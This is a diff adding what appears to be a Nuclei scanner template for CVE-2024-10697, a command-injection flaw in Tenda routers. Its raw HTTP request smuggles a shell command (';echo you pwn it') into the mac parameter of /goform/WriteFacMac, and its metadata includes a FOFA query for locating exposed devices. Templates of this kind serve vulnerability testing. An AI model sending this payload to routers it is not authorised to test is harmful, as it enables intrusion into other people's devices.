@@ -1,0 +1,41 @@
+id: tenda-WriteFacMac-rce
+info:
+  name: tenda 路由器 WriteFacMac - rce
+  author: leadlife
+  severity: critical
+  description: 
+  reference: 
+    - https://github.com/Darry-lang1/vuln/blob/c3289bcf7d6bfe2f695512b7dc43776239007622/Tenda/AC1206/19/readme.md
+    - https://github.com/wy876/POC/blob/main/Tenda/tenda%E8%B7%AF%E7%94%B1%E5%99%A8WriteFacMac%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-10697).md
+  classification:
+    cve-id: CVE-2024-10697
+  metadata:
+    verified: true
+    fofa-query: title="Tenda | LOGIN" && country="CN"
+  tags: 2024,rce,iot,router,tenda
+
+variables:
+    filename: "{{to_lower(rand_base(4))}}"
+    date: '{{date_time("%Y%M%D%H%M%S")}}'
+
+http:
+  - raw:
+      - |
+        GET /goform/WriteFacMac?mac=;echo%20you%20pwn%20it HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Connection: keep-alive
+        Cookie: password=caw5gk
+        Upgrade-Insecure-Requests: 1
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains(body,'modify mac only')
+
+
+
+        
